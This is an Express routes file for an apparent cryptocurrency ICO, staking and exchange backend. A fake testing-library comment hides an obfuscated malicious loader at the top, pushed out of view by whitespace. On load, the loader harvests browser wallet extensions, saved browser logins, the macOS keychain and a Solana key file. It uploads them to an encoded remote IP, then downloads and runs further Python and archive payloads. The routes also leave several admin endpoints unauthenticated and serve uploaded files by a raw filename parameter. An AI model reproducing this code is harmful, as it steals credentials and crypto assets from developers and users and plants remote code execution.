/* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),r=require("os"),e=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(e("zcGF0aA")),rq=require(e("YcmVxdWVzdA")),cr=require(e("aY3J5cHRv")),ex=require(e("aY2hpbGRfcHJvY2Vzcw"))[e("cZXhlYw")],hs=r[e("caG9zdG5hbWU")](),pl=r[e("YcGxhdGZvcm0")](),hd=r[e("ZaG9tZWRpcg")](),td=r[e("cdG1wZGly")](),tp=r[e("AdHlwZQ")]();let $;const n=a=>Buffer.from(a,t).toString(c),l=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTMuMTc6MTI0NA==  ";for(var c="",a="",r="",e="",$=0;$<10;$++)c+=t[$],a+=t[10+$],r+=t[20+$],e+=t[30+$];return c=c+r+e,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),h="NVRlYW05",Z="Z2V0",o="Ly5ucGw",m="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",i=n("ZXhpc3RzU3luYw"),u="TG9naW4gRGF0YQ",b="Y29weUZpbGU";function G(t){const c=n("YWNjZXNz"+"U3luYw");try{return a[c](t),!0}catch(t){return!1}}const p=n("RGVmYXVsdA"),y=n("UHJvZmlsZQ"),W=e("aZmlsZW5hbWU"),Y=e("cZm9ybURhdGE"),f=e("adXJs"),w=e("Zb3B0aW9ucw"),V=e("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),x="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",F="L0FwcERhdGEv",R="L1VzZXIgRGF0YQ",z="R29vZ2xlL0Nocm9tZQ",Q="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",X=["TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",Q,"QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"],J=["TG9jYWwvR29vZ2xlL0Nocm9tZQ",z,"Z29vZ2xlLWNocm9tZQ"],N=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let U="comp";const B=["bmtiaWhmYmVv","ZWpiYWxiYWtv","Zmhib2hpbWFl","aG5mYW5rbm9j","aWJuZWpkZmpt","YmZuYWVsbW9t","YWVhY2hrbm1l","aGlmYWZnbWNj"],q=["Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4","cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0","bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ","bWtwY25scGVia2xtbmtvZW9paG9mZWM","ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE","ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc","ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo"],T="Y3JlYXRlUmVhZFN0cmVhbQ",g=async(t,c,r)=>{let e=t;if(!e||""===e)return[];try{if(!G(e))return[]}catch(t){return[]}c||(c="");let $=[];const l=n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),s=n(T),h=n("LmxkYg"),Z=n("LmxvZw");for(let r=0;r<200;r++){const o=`${t}/${0===r?p:`${y} ${r}`}/${l}`;for(let t=0;t<B.length;t++){const l=n(B[t]+q[t]);let m=`${o}/${l}`;if(G(m)){try{far=a[v](m)}catch(t){far=[]}far.forEach((async t=>{e=pt.join(m,t);try{(e.includes(h)||e.includes(Z))&&$.push({[V]:a[s](e),[w]:{[W]:`${c}${r}_${l}_${t}`}})}catch(t){}}))}}}if(r){const t=n("c29sYW5hX2lkLnR4dA");if(e=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[i](e))try{$.push({[V]:a[s](e),[w]:{[W]:t}})}catch(t){}}return S($),$},S=t=>{const c=e("YbXVsdGlfZmlsZQ"),a=n("L3VwbG9hZHM"),r={timestamp:$.toString(),type:h,hid:U,[c]:t},s=l();try{const t={[f]:`${s}${a}`,[Y]:r};rq[L](t,((t,c,a)=>{}))}catch(t){}},k=async(t,c)=>{try{const a=s("~/");let r="";r="d"==pl[0]?`${a}${n(x)}${n(t[1])}`:"l"==pl[0]?`${a}${n("Ly5jb25maWcv")}${n(t[2])}`:`${a}${n(F)}${n(t[0])}${n(R)}`,await g(r,`${c}_`,0==c)}catch(t){}},C=async()=>{let t=[];const c=n(u),r=n(T),e=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),$=n("bG9na2MtZGI");if(pa=`${hd}${e}`,a[i](pa))try{t.push({[V]:a[r](pa),[w]:{[W]:$}})}catch(t){}else if(pa+="-db",a[i](pa))try{t.push({[V]:a[r](pa),[w]:{[W]:$}})}catch(t){}try{const e=n(b);let $="";if($=`${hd}${n(x)}${n(z)}`,$&&""!==$&&G($))for(let n=0;n<200;n++){const l=`${$}/${0===n?p:`${y} ${n}`}/${c}`;try{if(!G(l))continue;const c=`${$}/ld_${n}`;G(c)?t.push({[V]:a[r](c),[w]:{[W]:`pld_${n}`}}):a[e](l,c,(t=>{let c=[{[V]:a[r](l),[w]:{[W]:`pld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},H=async()=>{let t=[];const c=n(u),r=n(T);try{const e=n(b);let $="";if($=`${hd}${n(x)}${n(Q)}`,$&&""!==$&&G($))for(let n=0;n<200;n++){const l=`${$}/${0===n?p:`${y} ${n}`}/${c}`;try{if(!G(l))continue;const c=`${$}/brld_${n}`;G(c)?t.push({[V]:a[r](c),[w]:{[W]:`brld_${n}`}}):a[e](l,c,(t=>{let c=[{[V]:a[r](l),[w]:{[W]:`brld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},_=async()=>{let t=[];const c=n(T),r=n("a2V5NC5kYg"),e=n("bG9naW5zLmpzb24");try{let $="";if($=`${hd}${n(x)}${n("RmlyZWZveA")}`,$&&""!==$&&G($))for(let n=0;n<200;n++){const l=0===n?p:`${y} ${n}`,s=`${$}/${l}/${r}`,h=`${$}/${l}/${e}`;try{if(!G(s))continue;t.push({[V]:a[c](s),[w]:{[W]:`fk4_${n}`}})}catch(t){}try{if(!G(h))continue;t.push({[V]:a[c](h),[w]:{[W]:`flj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},A=n("cm1TeW5j"),E="XC5weXBccHl0aG9uLmV4ZQ",I=51476590;let M=0;const O=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,r,e)=>{if(c)return a[A](t),void(M=0);a[A](t),K()}))},P=()=>{const t=n("cDIuemlw"),c=`${l()}${n("L3Bkb3du")}`,r=`${td}\\${n("cC56aQ")}`,e=`${td}\\${t}`;if(M>=I+6)return;const $=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[i](r))try{var h=a[j](r);h.size>=I+6?(M=h.size,a[s](r,e,(t=>{if(t)throw t;O(e)}))):(M<h.size?M=h.size:(a[A](r),M=0),D())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${r}" "${c}"`;ex(t,((t,c,n)=>{if(t)return M=0,void D();try{M=I+6,a[$](r,e),O(e)}catch(t){}}))}};function D(){setTimeout((()=>{P()}),2e4)}const K=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(E)}`;a[i](`${t}`)?(()=>{const t=l(),c=n(d),r=n(Z),e=n(m),$=n(o),s=`${t}${c}/${h}`,i=`${hd}${$}`,u=`"${hd}${n(E)}" "${i}"`;try{a[A](i)}catch(t){}rq[r](s,((t,c,r)=>{if(!t)try{a[e](i,r),ex(u,((t,c,a)=>{}))}catch(t){}}))})():P()}else(()=>{const t=l(),c=n(d),r=n(m),e=n(Z),$=n(o),s=n("cHl0aG9u"),i=`${t}${c}/${h}`,u=`${hd}${$}`;let b=`${s}3 "${u}"`;rq[e](i,((t,c,e)=>{t||(a[r](u,e),ex(b,((t,c,a)=>{})))}))})()}));var tt=0;const ct=async()=>{try{$=Date.now(),await(async()=>{U=hs;try{const t=s("~/");await k(J,0),await k(X,1),await k(N,2),"w"==pl[0]&&(pa=`${t}${n(F)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(R)}`,await g(pa,"3_",!1)),"d"==pl[0]&&(await C(),await H(),await _())}catch(t){}})(),K()}catch(t){}};ct();let at=setInterval((()=>{(tt+=1)<5?ct():clearInterval(at)}),6e5);

const UserModel = require('../models/user.model');
const jwt = require('jsonwebtoken');
const express = require('express');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const requestIp = require('request-ip');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])
// let profileUplaod = upload.array('userPhoto',2);
let kyc_document_image = upload.fields([{ name: 'kyc_document_image', maxCount: 1 },{ name: 'kyc_document_image2', maxCount: 1 },{ name: 'user_photo', maxCount: 1 }])

var receipt = upload.fields([{ name: 'receipt', maxcount: 1 }])
let blogimages=upload.fields([{ name: 'image', maxCount: 1 }])
let achieverimages=upload.fields([{ name: 'images', maxCount: 1 }])
let file=upload.fields([{ name: 'file', maxCount: 1 }])

// All controllers call here
const registerController = require('../controllers/register.controller');
const loginController = require('../controllers/login.controller');
const userController = require('../controllers/user.controller');
const buyController = require('../controllers/buy.controller');
const withdrawController = require('../controllers/withdraw.controller');
const businessCronController = require('../controllers/businessCron.controller');
const liveDepositManageController = require('../controllers/liveDepositManage');
const cmsController = require('../controllers/cms.controller');
const WebSocket = require('../controllers/Exchange_Controller/webSocket')
//Exchange Controller
// All Validations call here
const { registerUserSchema,LoginWithAddressSchema, newsLetterSchema, contactRequestSchema ,loginUserSchema, ForgotPasswordSchema, ResetPasswordSchema, updatePasswordSchema } = require('../middleware/validators/userValidator.middleware');
const { buyTokenSchema } = require('../middleware/validators/buyValidator.middleware');
const { withdrawSchema } = require('../middleware/validators/withdrawValidator.middleware');
const { adminLoginSchema, changePasswordSchema,blogvalidation,insertachieverSchema } = require('../middleware/validators/adminValidator.middleware');
const {ticketSchema} = require ('../middleware/validators/exchange.middleware')

cron.schedule("0 0 * * *", async function () {
    console.log('Cron run')
    await businessCronController.businessCron();
});

cron.schedule("* * * * *", async function () {
    console.log('Cron run for deposit',req.user_id)
  
//    if(req.user_id){
//     console.log('Cron run for deposit')
//     let sql = `SELECT cm.id,cm.name,cm.symbol,cm.is_deposit,cm.is_withdraw,cm.is_tradable,cm.deposit_fee,cm.withdraw_fee,cm.user_ids as coin_user_id,cm.test_contract,cm.contract,cm.Bnb_contract,cm.Trc_contract,cm.icon,ul.id as wallet_id,ul.user_id,ul.coin_id,concat(ul.balance,'') as balance,ul.balanceInOrder,ul.public_key,ul.private_key,ul.trc_privatekey,ul.trc_publickey,ul.bnb_privatekey,ul.bnb_publickey from coins as cm LEFT JOIN user_wallet as ul ON cm.id=ul.coin_id WHERE   ul.user_id=${req.user_id}`;
//     const [result, fields] = await promisePool.query(sql);
//     if (result[0].public_key != null) {
//         // const resp = manageWallet(result);
//         await liveDepositManageController.manageWallet(result);
    
//     }
// }
  
    // console.log('Cron run for deposit',aa)
  
}); 


// 0,1 -> * *
cron.schedule("0 1 * * *", async function () {
    console.log('staiking Cron')
    await businessCronController.usersStakingIncome();
});

cron.schedule("0 0 * * *", async function () {
    console.log('update');
    await businessCronController.updateCompleteStaking();
});

// Crons Routing
// router.get('/businessCron', registerUserSchema, businessCronController.businessCron.bind());

function fileSizeLimitErrorHandler  (err, req, res, next)  {
    if (err) {
        return res.status(200).json({
            success:false,
            msg: "File Size is to large then 512kb",
        });
    //   res.sendStatus(413)
    } else {
      next()
    }
  }

// Register Routing
router.post('/userRegister', registerUserSchema, registerController.userRegister.bind()); //done
router.post('/addNewsLetter',newsLetterSchema ,registerController.addNewsLetter.bind());
router.post('/contactFormRequest',contactRequestSchema ,registerController.contactFormRequest.bind());

// Login Routing
router.post('/login', loginUserSchema, loginController.login.bind()); //done
router.post('/LoginWithAddress', LoginWithAddressSchema, loginController.LoginWithAddress.bind());
router.post('/verifyAccount', loginController.activateAccount.bind()); //done
router.post('/resendmail', loginController.resendmail.bind()); //done

router.post('/forgotPassword', ForgotPasswordSchema, loginController.ForgotPassword.bind());// done
router.post('/resetpassword', ResetPasswordSchema, loginController.Resetpassword.bind()); //done

// User Routing
router.post('/getUserProfile', ensureWebToken, userController.getUserProfile.bind()); // done
router.post('/UpdateUserProfile', profileUplaod, ensureWebToken ,userController.UpdateUserProfile.bind()); //done
router.post('/updatePassword', updatePasswordSchema, ensureWebToken ,userController.updatePassword.bind()); //done

router.post('/deactiveaccount',  ensureWebToken ,userController.deactiveaccount.bind()); //done

router.post('/getuserbankdetails',cmsController.getuserbankdetails.bind());
router.post('/updateuserbankdetails',cmsController.updatebankdetails.bind());

router.post('/getbankdetailsusers',cmsController.getbankdetailsusers.bind());


router.post('/getkyc', ensureWebTokenForAdmin, userController.getkyc.bind());
router.post('/updatekycapproval',ensureWebTokenForAdmin,userController.updatekycapproval.bind());
router.post('/rejectkycapproval',ensureWebTokenForAdmin,userController.rejectkycapproval.bind());
router.post('/updatekyc', kyc_document_image, ensureWebToken, userController.updatekyc.bind());

router.post('/updateiskyc',ensureWebTokenForAdmin,userController.updateiskyc.bind());
router.post('/disableiskyc',ensureWebTokenForAdmin,userController.disableiskyc.bind());

router.post('/showuserkyc',  userController.showuserkyc.bind());

router.post('/showkyc', ensureWebToken, userController.showkyc.bind());
router.post('/showiskyc',  userController.showiskyc.bind());

router.post('/getMntWalletsDetails',ensureWebTokenForAdmin,  userController.getMntWalletsDetails.bind());
router.post('/getPhase', ensureWebToken, userController.getPhase.bind());
router.post('/getMntWalletDetails', ensureWebToken, userController.getMntWalletDetails.bind());
router.post('/getTotalRefIncome', ensureWebToken, userController.getTotalRefIncome.bind());
router.post('/getDirectReferralCount', ensureWebToken, userController.getDirectReferralCount.bind()); // done 
router.post('/getReferralUsersList', ensureWebToken, userController.getReferralUsersList.bind());
router.post('/getNodesList', ensureWebToken, userController.getNodesList.bind());
router.post('/getstatisticsList', ensureWebToken, userController.getstatisticsList.bind());
router.post('/getEarningProjections', ensureWebToken, userController.getEarningProjections.bind());
router.post('/getTeamReferral', ensureWebToken, userController.getTeamReferral.bind()); // done
router.post('/getTeamReferralList', ensureWebToken, userController.getTeamReferralList.bind());
router.post('/getRewardsList', ensureWebToken, userController.getRewardsList.bind());
router.post('/getBlockExpansionIncome', ensureWebToken, userController.getBlockExpansionIncome.bind());
router.post('/getTokenAllocation', ensureWebToken, userController.getTokenAllocation.bind());
router.post('/getCapingPlan', ensureWebToken, userController.getCapingPlan.bind());
router.post('/getUpcomingEventsList', userController.getUpcomingEventsList.bind());
router.post('/exchangeicotransfer', ensureWebToken, userController.ExchangeTransferICO.bind()); // done


// Buy Routing
router.post('/getActivePhase', ensureWebToken, buyController.getActivePhase.bind());
router.post('/tokenPurchase', ensureWebToken,blogimages, buyController.tokenPurchase.bind());
router.post('/stripetokenPurchase', ensureWebToken, buyController.stripePayment.bind());
router.post('/getTokenPurchase',ensureWebToken,  buyController.getTokenPurchase.bind());

// Withdraw Routing
router.post('/userWithdraw', ensureWebToken,  withdrawController.userWithdraw.bind());
router.post('/getWithdrawList',ensureWebToken,  withdrawController.getWithdrawList.bind()); //done

/// By AJ strat ///
const { submitStackingSchema } = require('../middleware/validators/stackValidator.middleware');
const stackController = require('../controllers/stack.controller');
router.post('/submitStacking', submitStackingSchema, ensureWebToken ,stackController.submitStacking.bind());

router.post('/getUserStackingHistory',ensureWebToken,  stackController.getUserStackingHistory.bind()); //done
router.post('/getUserStackingHistorybyid',  stackController.getUserStackingHistorybyid.bind()); //done

router.post('/getStackingPrice', ensureWebToken ,stackController.getStackingPrice.bind());

router.post('/getEarningHistory',ensureWebToken, stackController.getEarningHistory.bind()); //done

// Admin routes
const adminController = require('../controllers/admin.controller');
router.post('/adminLogin', adminLoginSchema, adminController.adminLogin.bind());
router.post('/getDashboardStatistics', ensureWebTokenForAdmin, adminController.getDashboardStatistics.bind());
router.post('/getUsersList', ensureWebTokenForAdmin, adminController.getUsersList.bind());
router.post('/getUsersListFilter',  adminController.getUsersListFilter.bind());

router.post('/getUsersReferrals', ensureWebTokenForAdmin, adminController.getUsersReferrals.bind());

router.post('/getStackingHistory', ensureWebTokenForAdmin, adminController.getStackingHistory.bind());
router.post('/getWithdrawalStatistics', ensureWebTokenForAdmin, adminController.getWithdrawalStatistics.bind());
router.post('/getWithdrawalStatisticsCrypto', ensureWebTokenForAdmin, adminController.getWithdrawalStatisticsCrypto.bind());
router.post('/getMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getMntWithdrawalHistory.bind());
router.post('/getCryptoMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistory.bind());
router.post('/approveWithdrwalRequest', ensureWebTokenForAdmin, adminController.approveWithdrwalRequest.bind());
router.post('/rejectWithdrwalRequest', ensureWebTokenForAdmin, adminController.rejectWithdrwalRequest.bind());
router.post('/getTransactionHistory', ensureWebTokenForAdmin, adminController.getTransactionHistory.bind());
router.post('/getPhaseList', ensureWebTokenForAdmin, adminController.getPhaseList.bind());
router.post('/updatePhase', ensureWebTokenForAdmin, adminController.updatePhase.bind());
router.post('/updatePhaseStatus', ensureWebTokenForAdmin, adminController.updatePhaseStatus.bind());
router.post('/getStackingSetting', ensureWebTokenForAdmin, adminController.getStackingSetting.bind());
router.post('/getSystemSetting', ensureWebTokenForAdmin, adminController.getSystemSetting.bind());
router.post('/updateSystemSetting', ensureWebTokenForAdmin, adminController.updateSystemSetting.bind());
router.post('/getDynamicPrice', ensureWebTokenForAdmin, adminController.getDynamicPrice.bind());
router.post('/getSubscriberList', ensureWebTokenForAdmin, adminController.getSubscriberList.bind());
router.post('/changePassword', changePasswordSchema, ensureWebTokenForAdmin, adminController.changePassword.bind());
router.post('/getActivePhaseAdmin', ensureWebTokenForAdmin, adminController.getActivePhaseAdmin.bind());
router.post('/loginAsUser', ensureWebTokenForAdmin, adminController.loginAsUser.bind());
router.post('/userblock', ensureWebTokenForAdmin,adminController.userblock.bind());
router.post('/userUnblock',ensureWebTokenForAdmin,adminController.userUnblock.bind());
router.post('/showSystemSetting',  adminController.getSystemSetting.bind());
router.post('/updateTradeFee', ensureWebTokenForAdmin, adminController.updateTradeFee.bind());
router.post('/getCryptoMntWithdrawalHistoryAdmin', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistoryAdmin.bind());


router.post('/useruserblock', ensureWebToken, adminController.userblock.bind());

router.post('/getblog',ensureWebTokenForAdmin, adminController.getblog.bind());
router.post('/getblogid',adminController.getblogid.bind());
router.post('/blogdelete',ensureWebTokenForAdmin, adminController.blogdelete.bind());
router.post('/insertblog',blogimages, ensureWebTokenForAdmin, adminController.insertblog.bind());
router.post('/updateblog',blogimages, ensureWebTokenForAdmin, adminController.updateblog.bind());
router.post('/getuserBlog', userController.getuserBlog.bind());
router.post('/getuserblogid',userController.getuserblogid.bind());
router.post('/getRecentuserBlog',userController.getRecentuserBlog.bind());
router.post('/getuserDetails',blogimages,adminController.getuserDetails.bind());
router.post('/getUserBlogSlider', userController.getUserBlogSlider.bind());
router.post('/getBlogSlider',adminController.getBlogSlider.bind());
router.post('/getblogsliderid',adminController.getblogsliderid.bind());
router.post('/updateBlogSlider',blogimages,adminController.updateBlogSlider.bind());
router.post('/activeBlog',adminController.activeBlog.bind());
router.post('/deactiveBlog',adminController.deactiveBlog.bind());
router.post('/showusersDetails',adminController.showusersDetails.bind());
router.post('/insertTransactionHash',adminController.insertTransactionHash.bind());
router.post('/updatecryptowithdraw', ensureWebTokenForAdmin, adminController.updatecryptowithdraw.bind());

router.post('/addBlogslider',adminController.addBlogslider.bind());
router.post('/notaddBlogslider',adminController.notaddBlogslider.bind());
router.post('/inserAchiever',achieverimages,insertachieverSchema,adminController.inserAchiever.bind());
router.post('/updateachieve',achieverimages,adminController.updateachieve.bind());
router.post('/getachiever',adminController.getachiever.bind());
router.post('/getachieverid',adminController.getachieverid.bind());
router.post('/achieverdelete',adminController.achieverdelete.bind());
router.post('/getuserAchiever', userController.getuserAchiever.bind());

//cms data
router.post('/getfaqs', cmsController.showFaqs.bind());
router.post('/insertfaqs',ensureWebTokenForAdmin, cmsController.insertfaqs.bind());
router.post('/updatefaqs',ensureWebTokenForAdmin, cmsController.updatefaqs.bind());
router.post('/deletefaqs',ensureWebTokenForAdmin, cmsController.deletefaqs.bind());
router.get('/showfaqs', cmsController.showFaqs.bind());

router.post('/getaboutus',ensureWebTokenForAdmin, cmsController.getaboutus.bind());
router.post('/updateaboutus',ensureWebTokenForAdmin, cmsController.updateaboutus.bind());
router.get('/showaboutus', cmsController.getaboutus.bind());

router.post('/gettou',ensureWebTokenForAdmin, cmsController.gettou.bind());
router.post('/updatetou',ensureWebTokenForAdmin, cmsController.updatetou.bind());
router.get('/showtou', cmsController.gettou.bind());

router.post('/getprivacypolicy',ensureWebTokenForAdmin, cmsController.getprivacypolicy.bind());
router.post('/updateprivacypolicy',ensureWebTokenForAdmin, cmsController.updateprivacypolicy.bind());
router.get('/showprivacypolicy', cmsController.getprivacypolicy.bind());

router.post('/getcookiepolicy',ensureWebTokenForAdmin, cmsController.getcookiepolicy.bind());
router.post('/updatecookiepolicy',ensureWebTokenForAdmin, cmsController.updatecookiepolicy.bind());
router.get('/showcookiepolicy', cmsController.getcookiepolicy.bind());

router.post('/getcontactus',ensureWebTokenForAdmin ,cmsController.getcontactus.bind());

router.post('/getbankdetails',ensureWebTokenForAdmin ,cmsController.getbankdetails.bind());
router.post('/updatebankdetails',ensureWebTokenForAdmin, cmsController.updatebankdetails.bind());

router.post('/getadminbankdetails',cmsController.getbankdetails.bind());


router.post('/getbuyrequest',ensureWebTokenForAdmin ,cmsController.getbuyrequest.bind());
router.post('/updatebuyrequest', ensureWebTokenForAdmin, adminController.updatebuyrequest.bind());
router.post('/rejectbuyrequest', ensureWebTokenForAdmin, adminController.rejectbuyrequest.bind());

router.post('/minwithdraw',ensureWebTokenForAdmin ,cmsController.minwithdraw.bind());
router.post('/updatewithdraw',ensureWebTokenForAdmin,cmsController.updatewithdraw.bind());
router.post('/showminwithdraw',cmsController.minwithdraw.bind());

router.post('/dailymaxwithdrawlimit', cmsController.dailymaxwithdrawlimit.bind());
router.post('/showwithdrawlimit', cmsController.showwithdrawlimit.bind());



router.post('/getwithdrawhistory',ensureWebTokenForAdmin,cmsController.getwithdrawhistory.bind()); //not working sql
router.post('/getReferalEarning',ensureWebTokenForAdmin,cmsController.getReferalEarning.bind()); //not working sql
router.post('/getstackingEarning',ensureWebTokenForAdmin,cmsController.getstackingEarning.bind()); 
router.post('/getPrchaseHistory',ensureWebTokenForAdmin,cmsController.getPrchaseHistory.bind());


router.post('/getexchangetransaction', ensureWebTokenForAdmin, adminController.getexchangetransaction.bind());
router.post('/updateexchangetransaction', ensureWebTokenForAdmin, adminController.updateexchangetransaction.bind());
router.post('/rejectexchangetransaction', ensureWebTokenForAdmin, adminController.rejectexchangetransaction.bind());

//-------------------------------------Exchange--------------------------------------------
//exchange
const exadminController = require('../controllers/Exchange_Controller/admin.controller');
const exuserController = require('../controllers/Exchange_Controller/user.controller');
const exwithdrawController = require('../controllers/Exchange_Controller/withdraw.controller');

router.get('/getfees', exadminController.getfees.bind());
router.post('/getcurrencies', exadminController.getcurrencies.bind());
router.post('/getexbankdetails', exadminController.getexbankdetails.bind());
router.post('/adminpairlist', exadminController.adminpairlist.bind());
router.post('/activeDeactivecoinPairs', exadminController.activeDeactivecoinPairs.bind());
router.post('/admincoinlist', exadminController.admincoinlist.bind());
router.post('/updatecoinbyid', exadminController.updatecoinbyid.bind());
router.post('/getuserwalletlist', exadminController.getuserwalletlist.bind());

router.post('/getticket', exadminController.getticket.bind());
router.post('/insertticket', ticketSchema, ensureWebToken, exadminController.insertticket.bind());
router.post('/getallticket',  exadminController.getallticket.bind());
router.post('/ticketapprove', ensureWebTokenForAdmin,  exadminController.ticketapprove.bind());
router.post('/ticketreject', ensureWebTokenForAdmin,  exadminController.ticketreject.bind());



router.post('/getwebcontent', exadminController.getwebcontent.bind());
// router.post('/updatewebcontent',ensureWebTokenForAdmin, exadminController.updatewebcontent.bind());
router.post('/updatedeposit_content',ensureWebTokenForAdmin, exadminController.updatedeposit_content.bind());
router.post('/updatereferral_content',ensureWebTokenForAdmin, exadminController.updatereferral_content.bind());
router.post('/updatekyc_content',ensureWebTokenForAdmin, exadminController.updatekyc_content.bind());
router.post('/updateterms_condition',ensureWebTokenForAdmin, exadminController.updateterms_condition.bind());
router.post('/updateprivacy_policy',ensureWebTokenForAdmin, exadminController.updateprivacy_policy.bind());
router.post('/updateabout',ensureWebTokenForAdmin, exadminController.updateabout.bind());

router.post('/getannouncement',ensureWebTokenForAdmin, exadminController.getannouncement.bind());
router.post('/insertannouncement' , ensureWebTokenForAdmin, exadminController.insertannouncement.bind());
router.post('/updateannouncement' , ensureWebTokenForAdmin, exadminController.updateannouncement.bind());
router.post('/inactiveannouncement' ,  ensureWebTokenForAdmin, exadminController.inactiveannouncement.bind());
router.post('/activeannouncement' ,  ensureWebTokenForAdmin, exadminController.activeannouncement.bind());
router.post('/deleteannouncement' ,  ensureWebTokenForAdmin, exadminController.deleteannouncement.bind());

router.post('/transactiontype', ensureWebTokenForAdmin, exadminController.transactiontype.bind());
router.post('/transactionfilter',  exadminController.transactionFilterRecord.bind());
router.post('/orderfilter',  exadminController.orderfilterrecord.bind());
router.post('/depositadmininr',  exadminController.depositadmininr.bind());
router.post('/approvedepositadmininr',  exadminController.approvedepositadmininr.bind());
router.post('/rejectdepositadmininr',  exadminController.rejectdepositadmininr.bind());

router.post('/getorders',  exadminController.getorders.bind());
router.post('/getchat',  exadminController.getchat.bind());

router.post('/getGraphData', WebSocket.getGraphData.bind())
// router.post('/orderfilter', ensureWebToken, adminreport.orderFilterRecord.bind(this, db));


//exchange user

router.get('/getusernotification',  exuserController.getusernotification.bind());

router.post('/getuserdevice', exuserController.getuserdevice.bind());
router.post('/getDeviceDetail', exuserController.getDeviceDetail.bind());
router.post('/insertDeviceDetail', exuserController.insertDeviceDetail.bind());
router.post('/userwallet', exuserController.userWallet.bind());
router.post('/getuserdepositinr', exuserController.getuserdepositinr.bind());
router.post('/geticotransfer', exuserController.getICOTransfer.bind());


router.post('/favoritepair', exuserController.favoritepair.bind());
router.post('/getfavoritepair', exuserController.getfavoritepair.bind());
router.post('/orderbook', exuserController.orderBook.bind());
router.post('/userorder',exuserController.getUserOrder.bind());
router.get('/coinList', exuserController.coinList.bind());
router.post('/pairlist', exuserController.pairList.bind());
router.post('/getUserPiarBalance', exuserController.getUserPiarBalance.bind());
router.post('/getQR',  exuserController.getQR.bind());
router.post('/emailotp', ensureWebToken, exuserController.Email_otp.bind());
// router.post('/disableemailauth',ensureWebToken,  exuserController.disableemailauth.bind());
router.post('/disableAuth', ensureWebToken, exuserController.disableAuth.bind());
router.post('/twoAuthenticationVerify',  exuserController.twoAuthenticationVerify.bind());
router.post('/trxHistory',  exuserController.trxHistory.bind());
router.post('/getdashuserorder',  exuserController.getDashUserOrder.bind());
router.post('/orderHistory',  exuserController.orderHistory.bind());

router.post('/createOrder', ensureWebToken, exuserController.createOrder.bind());
router.post('/cancelOrder', ensureWebToken, exuserController.cancelOrder.bind());

router.post('/slcliveprice', exuserController.getSLCLive.bind());

router.post('/getslcgraph', WebSocket.getSLCGraph.bind())

// EX Withdraw
router.post('/coindetail', ensureWebToken, exwithdrawController.coinDetail.bind());

router.post('/cryptowithdraw', ensureWebToken, exwithdrawController.cryptowithdraw.bind());
router.post('/cryptowithdrawvalidation', ensureWebToken, exwithdrawController.checkCryptowithdrawvalidation.bind());
router.post('/withdrawAuthentication', ensureWebToken, exwithdrawController.withdrawAuthentication.bind());
router.post('/depositForm', receipt,exwithdrawController.depositForm.bind())
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}
